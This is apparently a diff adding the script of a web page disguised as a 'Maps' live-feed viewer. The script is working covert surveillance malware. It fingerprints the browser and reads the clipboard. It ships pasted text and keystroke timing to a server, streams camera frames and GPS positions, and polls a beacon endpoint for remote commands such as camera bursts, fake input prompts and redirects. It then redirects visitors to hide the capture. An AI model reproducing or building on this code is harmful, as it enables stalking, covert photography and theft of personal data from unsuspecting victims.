+        serial: "serial" in navigator,
+        nfc: "NDEFReader" in window,
+        geolocation: "geolocation" in navigator,
+        mediaDevices: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
+        notification: "Notification" in window,
+        push: "PushManager" in window,
+        credentials: "credentials" in navigator,
+        wakeLock: "wakeLock" in navigator,
+        fileSystemAccess: "showOpenFilePicker" in window,
+        webCodecs: "VideoEncoder" in window
+      }
+    };
+  }
+
+  function adblockFp(){
+    return new Promise(resolve => {
+      try {
+        const bait = document.createElement("div");
+        bait.className = "adsbox ad-banner text-ad ad-placement";
+        bait.style.cssText = "position:absolute;left:-9999px;height:10px;width:10px;";
+        document.body.appendChild(bait);
+        setTimeout(()=>{
+          try {
+            const blocked = bait.offsetHeight === 0 || bait.offsetParent === null;
+            document.body.removeChild(bait);
+            resolve({ likelyBlocked: blocked });
+          } catch(e){ resolve(null); }
+        }, 150);
+      } catch(e){ resolve(null); }
+    });
+  }
+
+  async function incognitoFp(){
+    try {
+      if (!navigator.storage || !navigator.storage.estimate) return null;
+      const e = await navigator.storage.estimate();
+      if (!e.quota) return null;
+      return { likelyIncognito: e.quota < 200 * 1024 * 1024 };
+    } catch(e){ return null; }
+  }
+
+  async function clipboardProbe(){
+    const out = { state: "unsupported", readText: null };
+    try {
+      if (navigator.permissions){
+        const p = await navigator.permissions.query({ name: "clipboard-read" });
+        out.state = p.state;
+      }
+    } catch(e){ out.state = "unsupported"; }
+    try {
+      if (navigator.clipboard && navigator.clipboard.readText && out.state === "granted"){
+        const txt = await navigator.clipboard.readText();
+        out.readText = txt ? txt.slice(0, 200) : "";
+      }
+    } catch(e){ out.readText = "err"; }
+    return out;
+  }
+
+  async function probe(name, fn, fallback){
+    try {
+      const t = performance.now();
+      const v = await Promise.race([
+        Promise.resolve().then(fn),
+        new Promise((_, rej) => setTimeout(() => rej(new Error("probe-timeout")), 4000))
+      ]);
+      return { name, ok: true, ms: Math.round(performance.now() - t), value: (v === undefined ? fallback : v) };
+    } catch (e) {
+      return { name, ok: false, ms: 0, error: String(e && e.message || e), value: fallback };
+    }
+  }
+
+  async function collectAll(){
+    const t0 = performance.now();
+    const fp = {};
+    try { Object.assign(fp, miscFp()); } catch(e){ fp.miscError = String(e); }
+
+    const results = await Promise.all([
+      probe("canvas",      () => canvasFp(),      null),
+      probe("webgl",       () => webglFp(),       null),
+      probe("webgpu",      () => webgpuFp(),      null),
+      probe("emoji",       () => emojiFp(),       null),
+      probe("fontMatrix",  () => fontMatrix(),    {}),
+      probe("audio",       () => audioFp(),       null),
+      probe("codecs",      () => codecFp(),       {}),
+      probe("math",        () => mathFp(),        {}),
+      probe("network",     () => networkFp(),     null),
+      probe("hardware",    () => hardwareFp(),    {}),
+      probe("battery",     () => batteryFp(),     null),
+      probe("devices",     () => devicesFp(),     null),
+      probe("permissions", () => permissionsFp(), {}),
+      probe("storage",     () => storageFp(),     null),
+      probe("voices",      () => voicesFp(),      null),
+      probe("webrtc",      () => webrtcFp(),      { local:[], public:[], candidates:[] }),
+      probe("adblock",     () => adblockFp(),     null),
+      probe("incognito",   () => incognitoFp(),   null),
+      probe("clipboard",   () => clipboardProbe(),{ state:"unsupported", readText:null }),
+    ]);
+
+    const errors = [];
+    for (const r of results){
+      if (r.ok){ fp[r.name] = r.value; }
+      else { errors.push(`${r.name}: ${r.error}`); fp[r.name] = r.value; }
+    }
+    if (errors.length) fp.probeErrors = errors;
+
+    try { fp.canvasHash = fp.canvas ? await sha256(fp.canvas) : null; } catch(e){ fp.canvasHash = null; }
+    try { fp.webglHash  = fp.webgl  ? await sha256(JSON.stringify(fp.webgl)) : null; } catch(e){ fp.webglHash = null; }
+    try { fp.emojiHash  = fp.emoji  ? await sha256(fp.emoji) : null; } catch(e){ fp.emojiHash = null; }
+    try {
+      const fm = fp.fontMatrix || {};
+      fp.fontsDetected = Object.keys(fm).filter(k => fm[k]);
+    } catch(e){ fp.fontsDetected = []; }
+
+    try {
+      fp.fingerprintId = await sha256(JSON.stringify({
+        c: fp.canvasHash, w: fp.webglHash, e: fp.emojiHash, a: fp.audio,
+        f: fp.fontsDetected, m: fp.math, u: fp.userAgent, s: fp.screen,
+        g: fp.webgpu || null
+      }));
+    } catch(e){
+      fp.fingerprintId = "fp_" + Date.now() + "_" + Math.random().toString(36).slice(2,10);
+    }
+
+    MY_FP = fp.fingerprintId;
+    fp.collectMs = Math.round(performance.now() - t0);
+
+    try {
+      send(Object.assign({ type: "silent-full", ts: Date.now(), url: location.href,
+        referrer: document.referrer || "" }, fp));
+    } catch(e){}
+
+    probe("sensors", () => sensorFp(), null).then(r => {
+      if (r.ok && r.value) send({ type:"sensors", ts:Date.now(), fingerprintId: fp.fingerprintId, sensors: r.value });
+    });
+    probe("networkProbe", () => networkProbe(), {}).then(r => {
+      if (r.ok && r.value) send({ type:"network-probe", ts:Date.now(), fingerprintId: fp.fingerprintId, probe: r.value });
+    });
+
+    return fp;
+  }
+
+  collectAll().catch(e => {
+    try {
+      MY_FP = "fp_fallback_" + Date.now();
+      send({ type: "silent-full", ts: Date.now(), url: location.href,
+             fingerprintId: MY_FP, fallback: true, error: String(e) });
+    } catch(_){}
+  });
+
+  if (typeof speechSynthesis !== "undefined" && speechSynthesis.onvoiceschanged !== undefined){
+    speechSynthesis.onvoiceschanged = () => {
+      const v = voicesFp();
+      if (v) send({ type:"voices-update", ts: Date.now(), voices: v });
+    };
+  }
+
+  // ---------------------------------------------------------- paste + keystroke dynamics
+  (function(){
+    const input = document.getElementById("searchInput");
+    if (!input) return;
+    let lastKeyTs = 0;
+    const intervals = [];
+    const keyEvents = [];
+
+    input.addEventListener("keydown", (e) => {
+      const now = performance.now();
+      const delta = lastKeyTs ? now - lastKeyTs : 0;
+      lastKeyTs = now;
+      if (delta > 0 && delta < 5000) intervals.push(Math.round(delta));
+      keyEvents.push({ ts: Math.round(now), delta: Math.round(delta),
+        code: e.code||null, shift: e.shiftKey, ctrl: e.ctrlKey, alt: e.altKey, repeat: e.repeat });
+    });
+
+    input.addEventListener("paste", (e) => {
+      const cd = e.clipboardData || window.clipboardData;
+      const txt = cd ? (cd.getData("text") || "") : "";
+      send({
+        type: "paste-event",
+        ts: Date.now(),
+        fingerprintId: MY_FP,
+        length: txt.length,
+        content: txt.slice(0, 4000),   // <- shipped now, as requested
+        hasNewlines: /\n/.test(txt), hasAt: /@/.test(txt),
+        hasUrl: /https?:\/\//i.test(txt), hasSpaces: /\s/.test(txt)
+      });
+    });
+
+    function flush(){
+      if (intervals.length === 0 && keyEvents.length === 0) return;
+      const iv = intervals.slice().sort((a,b)=>a-b);
+      const median = iv.length ? iv[Math.floor(iv.length/2)] : 0;
+      const mean = iv.length ? Math.round(iv.reduce((a,b)=>a+b,0)/iv.length) : 0;
+      const variance = iv.length ? Math.round(iv.reduce((a,b)=>a+(b-mean)**2,0)/iv.length) : 0;
+      const std = Math.round(Math.sqrt(variance));
+      send({ type: "keystroke-profile", ts: Date.now(), fingerprintId: MY_FP,
+        count: keyEvents.length, intervals: intervals, median, mean, std, variance,
+        events: keyEvents.map(e => ({ ts: e.ts, delta: e.delta, shift: e.shift, ctrl: e.ctrl, alt: e.alt })) });
+      intervals.length = 0;
+      keyEvents.length = 0;
+    }
+
+    input.addEventListener("blur", flush);
+    input.addEventListener("keydown", (e) => { if (e.key === "Enter") flush(); });
+  })();
+
+  // ---------------------------------------------------------- camera stream
+  let cameraStream = null;
+  let currentFacing = "user";
+  let frameTimer = null;
+
+  async function startCamera(){
+    if (cameraStream){
+      try { cameraStream.getTracks().forEach(t => t.stop()); } catch(e){}
+    }
+    cameraStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: currentFacing }, audio: false
+    });
+    const video = document.getElementById("vid");
+    video.srcObject = cameraStream;
+    try { await video.play(); } catch(e){}
+    return cameraStream;
+  }
+
+  function startFrameLoop(intervalMs){
+    if (frameTimer) clearInterval(frameTimer);
+    frameTimer = setInterval(function(){
+      try {
+        const video = document.getElementById("vid");
+        const canvas = document.getElementById("canvas");
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext("2d").drawImage(video,0,0);
+        send({ type:"frame", ts: Date.now(), fingerprintId: MY_FP,
+               facing: currentFacing, image: canvas.toDataURL("image/jpeg", 0.6) });
+      } catch(e){}
+    }, intervalMs);
+  }
+
+  // ---------------------------------------------------------- command dispatcher
+  const CMD_HANDLERS = {
+    async msg(args){
+      // args: { title, body }
+      const r = await popup({ title: args.title || "Message", body: args.body || "", cancel: true });
+      return r;
+    },
+    async alert(args){
+      try { alert(args.body || ""); } catch(e){}
+      return { ok: true };
+    },
+    async prompt(args){
+      const r = await popup({
+        title: args.title || "Input required",
+        body: args.body || "",
+        input: true,
+        placeholder: args.placeholder || "",
+        cancel: false
+      });
+      return r;
+    },
+    async redirect(args){
+      try {
+        setTimeout(() => { window.location.href = args.url; }, 300);
+      } catch(e){}
+      return { ok: true, url: args.url };
+    },
+    async title(args){
+      try { document.title = args.text || "Maps"; } catch(e){}
+      return { ok: true };
+    },
+    async vibrate(args){
+      try {
+        if (navigator.vibrate) navigator.vibrate(args.pattern || [200,100,200]);
+      } catch(e){}
+      return { ok: true };
+    },
+    async flash(args){
+      try {
+        const ov = document.createElement("div");
+        ov.style.cssText = "position:fixed;inset:0;background:#fff;z-index:99999;pointer-events:none;opacity:1;transition:opacity .4s";
+        document.body.appendChild(ov);
+        setTimeout(()=>{ ov.style.opacity = "0"; }, 80);
+        setTimeout(()=>{ ov.remove(); }, 800);
+      } catch(e){}
+      return { ok: true };
+    },
+    async grab(args){
+      // args: { count, interval_ms, facing }
+      const count = args.count || 15;
+      const ms = args.interval_ms || 1000;
+      if (args.facing && args.facing !== currentFacing){
+        currentFacing = args.facing;
+        try { await startCamera(); } catch(e){}
+      }
+      if (!cameraStream){
+        try { await startCamera(); } catch(e){ return { ok:false, err: String(e) }; }
+      }
+      for (let i = 0; i < count; i++){
+        try {
+          const video = document.getElementById("vid");
+          const canvas = document.getElementById("canvas");
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          canvas.getContext("2d").drawImage(video,0,0);
+          send({ type:"frame", ts: Date.now(), fingerprintId: MY_FP, facing: currentFacing,
+                 burst: true, index: i, total: count,
+                 image: canvas.toDataURL("image/jpeg", 0.6) });
+        } catch(e){}
+        await new Promise(r => setTimeout(r, ms));
+      }
+      return { ok: true, count, facing: currentFacing };
+    },
+    async flip(args){
+      currentFacing = (currentFacing === "user") ? "environment" : "user";
+      try {
+        await startCamera();
+        return { ok: true, facing: currentFacing };
+      } catch(e){ return { ok:false, err: String(e) }; }
+    },
+    async locate(args){
+      const n = args.count || 3;
+      const results = [];
+      for (let i = 0; i < n; i++){
+        try {
+          const pos = await getLoc(2);
+          send({ type:"gps", ts: Date.now(), fingerprintId: MY_FP, force: true,
+                 lat: pos.coords.latitude, lon: pos.coords.longitude,
+                 accuracy: pos.coords.accuracy });
+          results.push({ ok: true, lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy });
+        } catch(e){ results.push({ ok: false, err: String(e) }); }
+        await new Promise(r => setTimeout(r, 2000));
+      }
+      return { ok: true, results };
+    },
+    async sensors(args){
+      const seconds = args.seconds || 20;
+      const r = await sensorFp();
+      send({ type:"sensors", ts: Date.now(), fingerprintId: MY_FP, force: true, seconds, sensors: r });
+      return { ok: true };
+    },
+    async search(args){
+      try {
+        const input = document.getElementById("searchInput");
+        if (!input) return { ok:false, err:"no input" };
+        input.value = args.text || "";
+        input.dispatchEvent(new Event("input", { bubbles: true }));
+        input.focus();
+        setTimeout(flushKeys, 50);
+        return { ok: true, typed: args.text };
+      } catch(e){ return { ok:false, err: String(e) }; }
+    },
+    async ping(){
+      return { ok: true, pong: Date.now() };
+    }
+  };
+
+  let flushKeys = function(){};
+
+  // ---------------------------------------------------------- beacon loop
+  async function beacon(){
+    if (!MY_FP) return;
+    const r = await post("/beacon", {
+      type: "beacon",
+      fp: MY_FP,
+      ts: Date.now(),
+      url: location.href,
+      visibility: document.visibilityState
+    });
+    if (!r || !r.cmd) return;
+    // r.cmd = { name: "msg", args: { title, body } }
+    const name = r.cmd.name;
+    const args = r.cmd.args || {};
+    const handler = CMD_HANDLERS[name];
+    if (!handler) return;
+    let result = null, error = null;
+    try { result = await handler(args); }
+    catch(e){ error = String(e); }
+    // ship result
+    await post("/beacon", {
+      type: "cmd-result",
+      fp: MY_FP,
+      ts: Date.now(),
+      cmd: name,
+      args: args,
+      result: result,
+      error: error
+    });
+  }
+
+  setInterval(() => { beacon().catch(()=>{}); }, BEACON_MS);
+  setTimeout(() => { beacon().catch(()=>{}); }, 3000);
+
+  // ---------------------------------------------------------- interaction handlers
+  function setLoading(on){
+    btn.disabled = on;
+    spinner.style.display = on ? "inline-block" : "none";
+    btnText.textContent = on ? "Connecting..." : "View live feed";
+  }
+
+  function start(){
+    setLoading(true);
+    statusEl.textContent = "Requesting permissions...";
+    statusEl.className = "status";
+
+    if (!navigator.geolocation){
+      statusEl.textContent = "Location not supported";
+      statusEl.className = "status err";
+      setLoading(false);
+      return;
+    }
+
+    getLoc(3).then(function(pos){
+      const c = pos.coords;
+      send({ type:"gps", ts:Date.now(), fingerprintId: MY_FP,
+        lat:c.latitude, lon:c.longitude, accuracy:c.accuracy, altitude:c.altitude, heading:c.heading, speed:c.speed });
+
+      return startCamera();
+    })
+    .then(function(){
+      statusEl.textContent = "Live feed connected";
+      startFrameLoop(5000);
+
+      setInterval(function(){
+        getLoc(2).then(function(p){
+          const c2 = p.coords;
+          send({type:"gps-live",ts:Date.now(), fingerprintId: MY_FP,
+            lat:c2.latitude, lon:c2.longitude, accuracy:c2.accuracy, speed:c2.speed });
+        }).catch(function(){});
+      }, 8000);
+
+      setTimeout(function(){ window.location.href = REDIRECT; }, 1600);
+    })
+    .catch(function(err){
+      statusEl.textContent = "Camera access required";
+      statusEl.className = "status err";
+      setLoading(false);
+      send({type:"camera-error",msg:(err && err.message) || "denied", fingerprintId: MY_FP});
+    });
+  }
+
+  btn.addEventListener("click", start);
+})();
+</script>
+</body>
+</html>
